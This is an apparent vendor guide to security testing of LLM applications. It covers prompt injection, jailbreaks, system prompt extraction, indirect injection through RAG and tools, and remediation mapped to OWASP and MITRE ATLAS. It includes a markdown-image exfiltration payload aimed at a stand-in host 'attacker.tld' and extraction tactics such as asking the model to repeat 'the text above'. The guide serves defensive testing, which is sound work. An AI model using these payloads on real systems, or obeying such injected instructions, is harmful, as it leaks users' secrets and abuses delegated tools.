AI Security Testing: The Complete Guide to LLM & AI Penetration Testing

AI security testing is the practice of attacking an AI-powered application — a chatbot, copilot, RAG search, or autonomous agent — the way a real adversary would, to find where the model, its data and its tools can be abused. It covers the classic web and API attack surface plus a new layer traditional pentests miss: prompt injection, jailbreaks, data leakage through model output, poisoned retrieval data and over-privileged agents.

This guide explains what to test, how to test it, which frameworks to map findings to, and which free tools help you start.

Why AI applications need their own security testing

A traditional web application does what its code says. An LLM application does what its prompt says — and the prompt is assembled at runtime from developer instructions, user input, retrieved documents, tool results and chat history. Any of those sources can carry instructions. That means the boundary between "data" and "code" that classic security relies on is blurred, and a scanner looking for SQL injection will never notice that a support ticket can tell your agent to email your customer list to an attacker.

Three things make AI systems different to test:

  • Non-determinism — the same payload may fail nine times and work on the tenth. Tests need repetition and variation.
  • Natural-language attack surface — payloads can be paraphrased, translated, encoded or hidden in invisible Unicode.
  • Delegated authority — agents hold tokens and call APIs. The impact of a successful injection equals whatever the agent is allowed to do.

Frameworks to map AI security findings to

  • OWASP Top 10 for LLM Applications (2025) — the most practical starting point for application testing. See OWASP LLM Top 10 explained and the free interactive checklist.
  • MITRE ATLAS — an ATT&CK-style knowledge base of adversary tactics and techniques against AI systems; useful for red-team planning and threat modelling.
  • NIST AI Risk Management Framework (AI RMF) — governance-level framework (Govern, Map, Measure, Manage) that testing evidence feeds into.
  • ISO/IEC 42001 — the AI management system standard; security test results support its risk-treatment controls.

AI penetration testing methodology

  1. Scope and architecture review. Identify the model(s), every input channel, every data source the model reads, every tool it can call, and whose identity those tools act with.
  2. Threat model. For each tool and data source ask: if an attacker controlled this text, what is the worst action the system could take?
  3. Baseline the classic surface. Authentication, session handling, IDOR and rate limits on the chat and admin APIs. AI apps still fail the basics.
  4. System prompt and guardrail discovery. Attempt extraction; map what the model refuses and why.
  5. Direct prompt injection and jailbreaks. Run a structured payload set (override, persona, encoding, multi-turn, language switching). Repeat each payload several times.
  6. Indirect prompt injection. Plant payloads in every content source — uploaded files, web pages the agent browses, emails, tickets, RAG documents.
  7. Output handling. Make the model produce HTML, JavaScript, markdown images, SQL and shell strings; see what downstream components do with them.
  8. Agency and tool abuse. Chain an injection into real actions: send messages, read files, call internal APIs, change records.
  9. Data leakage and RAG authorisation. Try to retrieve other users' or tenants' data, training data or secrets.
  10. Consumption and abuse. Long inputs, recursive agent loops and token-heavy requests to test cost and availability limits.

2. System prompt leakage

Ask the model to repeat, translate, summarise or encode "the text above". If the system prompt contains credentials or the only copy of an authorisation rule, that is a finding even before it leaks.

3. Data exfiltration via output

If the UI renders markdown, an injected instruction can make the model output ![](https://attacker.tld/?q=<secret>); the browser fetches the image and sends the data. Check whether external images and links are rendered automatically.

4. Excessive agency

Map every tool. For each one, prove whether untrusted content can trigger it without user approval and whether it runs with the user's permissions or a shared service account.

5. RAG and vector store authorisation

Confirm retrieval is filtered by the caller's permissions. See the RAG security testing checklist.

Reporting and remediation

Write AI findings like any other pentest finding — title, impact, reproduction steps, evidence, risk rating — and add the OWASP LLM ID and how often the payload succeeded (for example "7 of 10 attempts"). Remediation rarely means "a better prompt". The durable fixes are architectural:

  • Least-privilege tools that act with the end user's identity
  • Human approval for destructive, financial or external-communication actions
  • Treat model output as untrusted: encode, sanitise and validate before use
  • Authorisation enforced in code and in retrieval, never only in the system prompt
  • Block auto-rendering of external images and links in AI responses
  • Rate limits, token limits and cost alerting

FAQ

What is AI security testing?

AI security testing is adversarial testing of applications that use AI or large language models. It covers prompt injection, jailbreaks, system prompt leakage, data leakage, insecure output handling, excessive agent permissions and RAG authorisation, alongside the usual web and API security checks.

How is AI penetration testing different from a normal pentest?

A normal pentest focuses on code-level flaws such as injection and broken access control. AI penetration testing adds attacks delivered in natural language, where any text the model reads can act as an instruction, and it measures what the model's tools and data access let an attacker do.

Which framework should I use for LLM security testing?

Use the OWASP Top 10 for LLM Applications as the primary test checklist, MITRE ATLAS for adversary techniques and threat modelling, and NIST AI RMF or ISO/IEC 42001 for governance reporting.
